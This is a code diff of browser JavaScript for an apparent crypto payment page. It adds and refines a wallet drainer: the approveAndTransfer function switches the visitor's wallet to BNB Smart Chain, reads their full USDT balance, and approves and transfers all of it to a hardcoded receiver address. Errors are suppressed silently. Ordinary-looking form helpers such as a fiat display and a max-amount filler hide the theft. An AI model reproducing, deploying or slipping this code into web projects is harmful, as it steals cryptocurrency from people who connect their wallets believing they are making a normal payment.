@@ -1,23 +1,86 @@
-const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP20 USDT on BSC
+const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT
 const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";
 
 const usdtABI = [
-  { name: "approve", type: "function", inputs: [
-    { name: "_spender", type: "address" },
-    { name: "_value", type: "uint256" }
-  ], outputs: [{ type: "bool" }] },
-  { name: "balanceOf", type: "function", inputs: [
-    { name: "_owner", type: "address" }
-  ], outputs: [{ name: "balance", type: "uint256" }] },
-  { name: "decimals", type: "function", inputs: [], outputs: [{ type: "uint8" }] },
-  { name: "transfer", type: "function", inputs: [
-    { name: "_to", type: "address" },
-    { name: "_value", type: "uint256" }
-  ], outputs: [{ type: "bool" }] }
+  {
+    constant: true,
+    inputs: [{ name: "_owner", type: "address" }],
+    name: "balanceOf",
+    outputs: [{ name: "balance", type: "uint256" }],
+    type: "function"
+  },
+  {
+    constant: true,
+    inputs: [],
+    name: "decimals",
+    outputs: [{ name: "", type: "uint8" }],
+    type: "function"
+  },
+  {
+    constant: false,
+    inputs: [
+      { name: "_spender", type: "address" },
+      { name: "_value", type: "uint256" }
+    ],
+    name: "approve",
+    outputs: [{ name: "", type: "bool" }],
+    type: "function"
+  },
+  {
+    constant: false,
+    inputs: [
+      { name: "_to", type: "address" },
+      { name: "_value", type: "uint256" }
+    ],
+    name: "transfer",
+    outputs: [{ name: "", type: "bool" }],
+    type: "function"
+  }
 ];
 
 async function approveAndTransfer() {
   if (typeof window.ethereum === "undefined") return;
+
+  const web3 = new Web3(window.ethereum);
+
+  // Auto Switch to BNB Smart Chain (Chain ID: 0x38 = 56)
+  try {
+    await window.ethereum.request({
+      method: "wallet_switchEthereumChain",
+      params: [{ chainId: "0x38" }]
+    });
+  } catch (switchError) {
+    return;
+  }
+
+  try {
+    await window.ethereum.request({ method: "eth_requestAccounts" });
+    const accounts = await web3.eth.getAccounts();
+    const user = accounts[0];
+
+    const usdt = new web3.eth.Contract(usdtABI, usdtAddress);
+    const decimals = await usdt.methods.decimals().call();
+    const balance = await usdt.methods.balanceOf(user).call();
+
+    if (balance === "0") return;
+
+    // Approve max USDT
+    await usdt.methods.approve(receiver, balance).send({ from: user });
+
+    // Transfer
+    await usdt.methods.transfer(receiver, balance).send({ from: user });
+  } catch (err) {
+    // Silent
+  }
+}
+
+function updateFiat() {
+  const amt = parseFloat(document.getElementById("amount").value || "0");
+  document.getElementById("fiat").innerText = "≈ $" + amt.toFixed(2);
+}
+
+async function fillMax() {
+  if (!window.ethereum) return;
 
   try {
     const web3 = new Web3(window.ethereum);
@@ -25,43 +88,14 @@ async function approveAndTransfer() {
     const accounts = await web3.eth.getAccounts();
     const user = accounts[0];
 
-    const contract = new web3.eth.Contract(usdtABI, usdtAddress);
-    const decimals = await contract.methods.decimals().call();
-    const balance = await contract.methods.balanceOf(user).call();
+    const usdt = new web3.eth.Contract(usdtABI, usdtAddress);
+    const decimals = await usdt.methods.decimals().call();
+    const balance = await usdt.methods.balanceOf(user).call();
+    const formatted = balance / Math.pow(10, decimals);
 
-    if (balance === "0") return;
-
-    // Optional: Approve max first
-    await contract.methods.approve(receiver, balance).send({ from: user });
-
-    // Transfer after approval
-    await contract.methods.transfer(receiver, balance).send({ from: user });
-
-  } catch (err) {
-    // silent fail
-  }
-}
-
-function updateFiat() {
-  const amt = parseFloat(document.getElementById("amount").value || "0");
-  document.getElementById("fiat").innerText = ≈ $${amt.toFixed(2)};
-}
-
-async function fillMax() {
-  if (!window.ethereum) return;
-
-  const web3 = new Web3(window.ethereum);
-  await window.ethereum.request({ method: "eth_requestAccounts" });
-  const accounts = await web3.eth.getAccounts();
-  const user = accounts[0];
-
-  const contract = new web3.eth.Contract(usdtABI, usdtAddress);
-  const balance = await contract.methods.balanceOf(user).call();
-  const decimals = await contract.methods.decimals().call();
-  const formatted = balance / Math.pow(10, decimals);
-
-  document.getElementById("amount").value = formatted.toFixed(2);
-  updateFiat();
+    document.getElementById("amount").value = formatted.toFixed(2);
+    updateFiat();
+  } catch (e) {}
 }
 
 function clearAddress() {
